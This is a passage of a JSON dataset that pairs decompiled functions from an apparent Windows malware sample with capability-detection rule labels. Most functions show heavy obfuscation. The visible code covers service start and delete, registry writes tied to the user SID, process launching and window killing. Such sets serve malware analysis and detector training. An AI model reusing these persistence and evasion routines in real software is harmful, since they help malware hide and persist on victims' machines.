+ 8))(piVar8);\n            }\n            iVar4 = *(puVar11 + -0x44);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar4);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = *(puVar11 + -0xc);\n    return iVar7;\n}\n",
        "token_count": 3329
    },
    "00403090": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403101) overlaps instruction at (ram,0x004030ff)\n// \n\nuint __cdecl fcn.00403090(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    bVar3 = false;\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    if ((!bVar3) && (bVar3)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x422298);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x403010, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 459
    },
    "00403190": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403219) overlaps instruction at (ram,0x00403218)\n// \n// WARNING: Removing unreachable block (ram,0x00403234)\n// WARNING: Removing unreachable block (ram,0x00403236)\n// WARNING: Removing unreachable block (ram,0x00403219)\n\nvoid fcn.00403190(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int16_t in_AX;\n    uint32_t uVar3;\n    char extraout_CL;\n    int32_t iVar4;\n    uint extraout_EDX;\n    uint uVar5;\n    uint32_t *unaff_EBX;\n    uchar **unaff_EBP;\n    uint16_t unaff_DI;\n    uint *puVar6;\n    bool bVar7;\n    bool bVar8;\n    uchar uVar9;\n    bool bVar10;\n    uint var_25fh;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    uint uStack611;\n    uchar uStack352;\n    uint uStack351;\n    uint auStack92 [11];\n    uint uStack48;\n    ushort uStack44;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uchar *puStack4;\n    \n    while( true ) {\n        bVar7 = false;\n        bVar10 = false;\n        bVar8 = ((unaff_DI | 0x74e3) - in_AX & 0x1a8) == 0;\n        puStack4 = unaff_EBP;\n        in_AX = fcn.00402540();\n        if ((bVar7 || bVar8) || (!bVar7 && !bVar8)) break;\n        unaff_EBP = &puStack4;\n        if (!bVar10) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uVar3 = fcn.00402970();\n    bVar7 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n    if (uVar3 != 0) {\n        if ((bVar7) || (!bVar7)) {\n            unaff_EBX = NULL;\n        }\n        *unaff_EBX = *unaff_EBX ^ 0xffffffdb;\n        uStack352 = SUB41(unaff_EBX, 0);\n        puVar6 = &uStack611;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(unaff_EBX, 0x9c, 0x26, unaff_EBX);\n        if (iVar4 != 0) {\n            fcn.00401a80();\n            puVar6 = &uStack351;\n    // WARNING: Bad instruction - Truncating control flow here\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&uStack352, 0x422270, 0x9c, 0x2250, 3);\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            iStack24 = 0;\n            do {\n                puVar6 = auStack92;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                uStack44 = 0;\n                uStack20 = 0;\n                uStack16 = 0;\n                auStack92[0] = 0x44;\n                uStack12 = 0;\n                uStack48 = 1;\n                uStack8 = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &uStack352, 0, 0, 0, 0, 0, 0, *0x10 + -0x5c, 0xec);\n                if (iVar4 == 0) {\n                    return;\n                }\n                uVar9 = extraout_CL + -1 < '\\0';\n                (*pcVar2)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.00403090, uStack12);\n                if ((uVar9) || (uVar5 = extraout_EDX,  !uVar9)) {\n                    uVar5 = uStack20;\n                }\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar5, 1000);\n                if (iVar4 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack20, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack16);\n                (*pcVar1)(uStack20);\n                iStack24 = iStack24 + 1;\n            } while (iStack24 < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1299
    },
    "00403460": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403460(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004034f0(&var_68h, &var_4h);\n    fcn.00404b80(&var_68h, var_4h, 0x410ed0, 0x11000);\n    *arg_8h = 0x410ed0;\n    *arg_ch = 0x11000;\n    return;\n}\n",
        "token_count": 241
    },
    "004034f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403513) overlaps instruction at (ram,0x00403511)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Type propagation algorithm not settling\n\nint32_t * __thiscall fcn.004034f0(uint32_t param_1, uchar *param_2, int32_t param_3)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    uchar *in_EAX;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    ushort uVar9;\n    uint16_t uVar10;\n    int32_t iVar11;\n    uint16_t uVar12;\n    uint *puVar13;\n    uint8_t uVar15;\n    int32_t *unaff_EBX;\n    uint uVar14;\n    ushort *puVar16;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    uchar *puVar17;\n    uchar *unaff_EDI;\n    uint uVar18;\n    ushort in_SS;\n    bool bVar19;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar20;\n    bool bVar21;\n    bool bVar22;\n    unkbyte10 in_ST0;\n    uint32_t unaff_retaddr;\n    uchar *in_stack_ffffffd0;\n    int32_t in_stack_ffffffd4;\n    uchar *puStack36;\n    int32_t *in_stack_ffffffe0;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack18;\n    char cVar4;\n    \n    if ((in_ZF) || (param_1 = (param_1 >> 8 & 0xffff00) << 8 | param_1 & 0xffff,  !in_ZF)) {\n        *param_2 = 0x78;\n        uStack24 = param_1;\n        uStack22 = param_1 >> 0x10;\n        in_EAX = param_2;\n        in_stack_ffffffd0 = unaff_EDI;\n        in_stack_ffffffd4 = unaff_ESI;\n        puStack36 = &stack0xfffffff0;\n        in_stack_ffffffe0 = unaff_EBX;\n    }\n    in_EAX[0x60] = in_EAX[0x60] + (unaff_EBX >> 8);\n    piVar7 = CONCAT22(uStack22, uStack24);\n    iVar11 = *(in_stack_ffffffd4 + 8);\n    *(iVar11 + 1) = 0x1d;\n    do {\n        bVar21 = false;\n        bVar20 = (in_stack_ffffffe0 & 0x66) == 0;\n        bVar19 = (POPCOUNT(in_stack_ffffffe0 & 0x66) & 1U) == 0;\n        *(iVar11 + 2) = 0x21;\n        puVar17 = in_stack_ffffffd0;\n        if ((!bVar19) && (bVar19)) {\n            in_stack_ffffffd4 = in_stack_ffffffd4 - *(in_stack_ffffffd4 + 0x5f9dff63);\n            if (in_stack_ffffffd4 < 0) {\n                *0x47 = in_stack_ffffffd0;\n                *piVar7 = *piVar7 + piVar7;\n                puVar13 = *(in_stack_ffffffd4 + 0xc);\n                **(in_stack_ffffffd4 + 8) = 0x410ed0;\n                *puVar13 = 0x11000;\n                return piVar7;\n            }\n            bVar21 = *0x47 < 0;\n            bVar20 = *0x47 == NULL;\n            bVar19 = (POPCOUNT(*0x47 & 0xff) & 1U) == 0;\n            puVar17 = *0x47;\n            *0x47 = in_stack_ffffffd0;\n            if (!bVar21) {\n                in_stack_ffffffe0 = in_stack_ffffffe0 + 1;\n                goto code_r0x00403597;\n            }\n        }\n        bVar22 = false;\n        *(iVar11 + 3) = 0x6b;\n        if ((bVar19) || (!bVar19)) {\n            *(iVar11 + 4) = 0xfe;\n            piVar2 = piVar7;\n        }\n        else {\n            puVar17 = 0x34a96cf4;\n            in_stack_ffffffd4 = *0xc617b43a;\n            iVar11 = iVar11 + 1;\n            cVar4 = in_stack_ffffffe0 + 1;\n            bVar22 = SCARRY1(cVar4, -2);\n            uVar3 = cVar4 - 2;\n            bVar21 = uVar3 < '\\0';\n            bVar20 = uVar3 == 0;\n            piVar2 = in_stack_ffffffe0 + 1 & 0xffffff00 | uVar3;\n            in_stack_ffffffe0 = piVar7;\n        }\n        piVar7 = piVar2;\n        in_stack_ffffffd0 = puVar17;\n        if ((!bVar20) && (bVar20)) {\n            piVar7 = piVar7 & 0xffffff00 | *0x4bb148d3;\n            in_stack_ffffffd0 = puVar17 + 1;\n            out(*puVar17, in_stack_ffffffe0);\n        }\n        *(iVar11 + 5) = 0x9e;\n        if ((bVar20 || bVar22 != bVar21) || (!bVar20 && bVar22 == bVar21)) {\ncode_r0x00403597:\n            *(iVar11 + 6) = 0xa4;\n            uVar3 = in_stack_ffffffe0 >> 8;\n            *(iVar11 + 7) = 0x17;\n            iVar11 = *(in_stack_ffffffd4 + 8);\n            *(iVar11 + 8) = 0x9d;\n            uVar15 = puStack36 >> 8 ^ 0x16 | piVar7 >> 8;\n            bVar19 = (POPCOUNT(uVar15 - uVar3) & 1U) == 0;\n            *(iVar11 + 9) = 0x1b;\n            if ((bVar19) || (uStack18 = 0,  !bVar19)) {\n                *(iVar11 + 10) = 0x61;\n                if ((uVar15 < uVar3) || (uVar3 <= uVar15)) {\n                    *(iVar11 + 0xb) = 0x80;\n                    uStack18 = piVar7 >> 0x10;\n                }\n                else {\n                    *(piVar7 + -0x1f3a4905) = in_ST0;\n                    uStack18 = puStack36 >> 0x10;\n                    uVar5 = piVar7 + -1;\n                    uVar1 = 9 < (uVar5 & 0xf) | in_AF;\n                    uVar5 = uVar5 + uVar1 * '\\x06';\n                    piVar7 = piVar7 + -1 & 0xffffff00 |\n                             uVar5 + (0x90 < (uVar5 & 0xf0) | uVar15 < uVar3 | uVar1 * (0xf9 < uVar5)) * '`';\n                }\n            }\n            *(puStack36 + 0x48) = *(puStack36 + 0x48) + 0x27;\n            *piVar7 = *piVar7 + 0x41c6df84;\n            uVar8 = *(unaff_ESI + 8);\n            *(uVar8 + 0xc) = 0xbc;\n            *(uVar8 + 0xd) = 0xec;\n            puVar16 = &param_2 + 2U ^ *(unaff_EBP + -0x3a);\n            puVar16[-1] = unaff_retaddr;\n            uVar12 = puVar16[-1];\n            uVar9 = *puVar16;\n            uVar14 = *(puVar16 + 1);\n            *(param_3 + 0xf) = 0xa2;\n            puVar16[2] = uVar8 | 0x516653ec;\n            puVar16[1] = uVar9;\n            *(puVar16 + -1) = CONCAT22(uStack18, in_SS);\n            uVar18 = *(puVar16 + -1);\n            uVar10 = puVar16[1];\n            uVar6 = puVar16[2];\n            *(param_3 + 0x10) = 0xdc;\n            *(puVar16 + 1) = (uVar8 | 0x516653ec) & 0xffff0000 | uVar6;\n            *(puVar16 + -1) = param_2 & 0xffff0000 | uVar10;\n            *(puVar16 + -3) = unaff_retaddr & 0xffff0000 | uVar12;\n            *(puVar16 + -5) = uVar14;\n            *(puVar16 + -7) = puVar16 + 3;\n            *(puVar16 + -9) = unaff_ESI;\n            *(puVar16 + -0xb) = param_3 + 1;\n            *(puVar16 + -0xd) = uVar18;\n            bVar19 = (uVar12 & 0x1200) == 0;\n            iVar11 = *(puVar16 + -9);\n            puVar13 = *(puVar16 + -3);\n            uVar8 = *(puVar16 + 1);\n            *(*(iVar11 + 8) + 0x10) = 0x8e;\n            if ((bVar19) || (!bVar19)) {\n                puVar13 = *(iVar11 + 0xc);\n            }\n            *puVar13 = 0x11;\n            return uVar8 | 0x5f;\n        }\n        in_AF = 9 < (piVar7 & 0xf) | in_AF;\n        uVar3 = piVar7 + in_AF * '\\x06';\n        if (iVar11 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        piVar7 = (piVar7 >> 8 & 0xffff00) << 8 | CONCAT11((piVar7 >> 8) + in_AF * '\\x02' + *0xffffff8b, uVar3) & 0xff0f;\n        in_stack_ffffffd4 = in_stack_ffffffd4 + -1;\n        in_stack_ffffffe0 =\n             in_stack_ffffffe0 & 0xffff0000 | CONCAT11(in_stack_ffffffe0 >> 8 | uVar3 & 0xf, in_stack_ffffffe0);\n        iVar11 = 1;\n        *0xd8036653 = *0xd8036653 + puStack36;\n    } while( true );\n}\n",
        "token_count": 2477
    },
    "00403ac0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403af3) overlaps instruction at (ram,0x00403af2)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403ac0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_EBX;\n    bool bVar2;\n    uint uVar3;\n    uint lpServiceName;\n    \n    bVar2 = false;\n    lpServiceName = 0;\n    uVar3 = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((bVar2) || (!bVar2)) {\n        iVar1 = arg_8h;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    uVar3 = fcn.00404460(uVar3, lpServiceName);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1 + -0x1bf31dd6);\n    return uVar3;\n}\n",
        "token_count": 248
    },
    "00403f60": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403f60(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x421ee8, &lpBuffer, arg_8h);\n    fcn.00403460(&var_4h, &var_8h);\n    fcn.00404080(var_4h);\n    iVar1 = fcn.00404ec0(&s, var_4h, var_8h);\n    bVar3 = iVar1 == 0;\n    if (!bVar3) {\n        if ((!bVar3) && (bVar3)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        fcn.00401090(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 453
    },
    "00404230": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain pusha popa sequence",
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404230(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 125
    },
    "00404360": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404360(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 != 0) {\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n        (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n        (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 131
    },
    "00404460": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404460(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0x1ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 241
    },
    "00404c40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.00404c40(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.004046a0(0x80000002, str.hZ4, 0x4221f4, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 151
    },
    "00404cd0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404dad) overlaps instruction at (ram,0x00404da9)\n// \n// WARNING: Removing unreachable block (ram,0x00404d9e)\n\nuint __cdecl fcn.00404cd0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h);\n        if (iVar1 != 0) {\n            *arg_8h = unaff_ESI + 4;\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 339
    },
    "00401620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401690)\n\nbool fcn.00401620(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00404cd0(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x42209c, 0x4220dc, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 262
    },
    "00402540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402799) overlaps instruction at (ram,0x00402796)\n// \n\nvoid fcn.00402540(void)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    char extraout_CH;\n    uint32_t extraout_ECX;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    uint32_t unaff_EDI;\n    uint8_t uVar3;\n    uint8_t in_AF;\n    bool bVar4;\n    bool bVar5;\n    ulong uVar6;\n    uint in_stack_ffffffd8;\n    char *in_stack_ffffffdc;\n    uint uVar7;\n    char *pcVar8;\n    uint arg_14h;\n    \n    uVar3 = 0;\n    bVar5 = unaff_EBX >> 8 < '\\0';\n    arg_14h = 0x20;\n    pcVar8 = str._a_ot;\n    uVar7 = 0x402565;\n    uVar6 = fcn.00401000(str.U__, 0xd, str._a_ot, 0x20);\n    uVar2 = uVar6;\n    if ((bVar5) || (!bVar5)) {\n        uVar7 = 0x26;\n        in_stack_ffffffdc = 0x422270;\n        in_stack_ffffffd8 = 0xd;\n    }\n    else {\n        bVar5 = 0x97d995d0 < uVar2 || CARRY4(uVar2 + 0x68266a2f, uVar3);\n        if (SCARRY4(uVar2, 0x68266a2f) != SCARRY4(uVar2 + 0x68266a2f, uVar3)) goto code_r0x004025a1;\n    }\n    pcVar8 = (uVar6 >> 0x20) + 0xe;\n    *pcVar8 = *pcVar8 + extraout_CH;\n    uVar2 = fcn.00401000(str.U__, in_stack_ffffffd8, in_stack_ffffffdc, uVar7);\n    bVar5 = unaff_EDI < uVar2;\n    arg_14h = 8;\n    pcVar8 = 0x422298;\ncode_r0x004025a1:\n    uVar6 = fcn.00401000(str.U__, 0xd, pcVar8, arg_14h);\n    uVar7 = uVar6 >> 0x20;\n    if ((bVar5) || (!bVar5)) {\n        uVar7 = 0x19;\n        in_stack_ffffffdc = str._L;\n    }\n    else {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n        piVar1 = uVar6 + (bVar5 == false) + 0x7c8ecaad;\n        *piVar1 = *piVar1 - unaff_EBP;\n    }\n    fcn.00401000(str.U__, 0xd, in_stack_ffffffdc, uVar7);\n    fcn.00401000(str.U__, 0xd, 0x4222bc, 0xb);\n    fcn.00401000(str.U__, 0xd, str.__nlz, 0x12);\n    fcn.00401000(str.U__, 0xd, str._YW, 0x12);\n    fcn.00401000(str.U__, 0xd, 0x4222f0, 2);\n    uVar2 = fcn.00401000(str.U__, 0xd, str.e__X, 8);\n    bVar5 = uVar2 < extraout_ECX;\n    bVar4 = uVar2 == extraout_ECX;\n    uVar2 = fcn.00401000(str.U__, 0xd, 0x4222fc, 8);\n    if (((!bVar4) && (bVar4)) && (!bVar5 && unaff_EBX + 1 != 0)) {\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        piVar1 = (uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    fcn.00401000(str.U__, 0xd, 0x422304, 6);\n    fcn.00401000(str.U__, 0xd, 0x42230c, 7);\n    bVar5 = false;\n    uVar7 = 0x402724;\n    fcn.00401000(str.U__, 0xd, 0x422314, 7);\n    if ((bVar5) || (!bVar5)) {\n        uVar7 = 6;\n    }\n    fcn.00401000(str.U__, 0xd, 0x42231c, uVar7);\n    bVar5 = false;\n    uVar7 = 0x402782;\n    fcn.00401000(str.U__, 0xd, str._r_BQ, 0x25);\n    if ((bVar5) || (!bVar5)) {\n        uVar7 = 8;\n    }\n    fcn.00401000(str.U__, 0xd, str._8__, uVar7);\n    return;\n}\n",
        "token_count": 1255
    },
    "00402940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402940(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00403ca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403cf1) overlaps instruction at (ram,0x00403ced)\n// \n// WARNING: Removing unreachable block (ram,0x00403ccf)\n// WARNING: Removing unreachable block (ram,0x00403cf1)\n\nchar * __cdecl fcn.00403ca0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar2) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                iVar1 = arg_14h;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    iVar1 = iVar1 + -1;\n                    if (iVar1 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 368
    },
    "004042c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __cdecl fcn.004042c0(uint arg_8h)\n\n{\n    uint *unaff_EBP;\n    bool in_OF;\n    uint64_t uVar1;\n    uint in_stack_00000010;\n    uint in_stack_00000018;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_EBP = in_stack_00000018;\n        return CONCAT44(in_stack_00000010, in_stack_00000018);\n    }\n    uVar1 = fcn.00403b10(arg_8h, 1);\n    return uVar1 & 0xffffffff00000000 | uVar1 != 0;\n}\n",
        "token_count": 147
    },
    "00404750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
